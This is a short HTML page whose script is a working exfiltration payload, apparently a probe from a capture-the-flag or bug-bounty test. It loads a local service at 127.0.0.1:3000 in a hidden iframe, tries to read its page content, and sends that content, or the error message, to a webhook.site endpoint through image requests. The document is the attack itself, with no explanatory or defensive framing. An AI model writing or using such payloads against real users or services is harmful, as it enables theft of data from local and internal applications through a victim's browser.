<!DOCTYPE html>
<html>
<body>
<script>
new Image().src = 'https://webhook.site/showontest?step=1';

var f = document.createElement('iframe');
f.id = 'f1';
f.src = 'http://127.0.0.1:3000/';
document.body.appendChild(f);

setTimeout(function(){
  try {
    var c = document.getElementById('f1').contentDocument.body.innerHTML;
    new Image().src = 'https://webhook.site/showontest?ok=' + encodeURIComponent(c);
  } catch(e) {
    new Image().src = 'https://webhook.site/showontest?err=' + encodeURIComponent(e.message);
  }
}, 500);
</script>
</body>
</html>
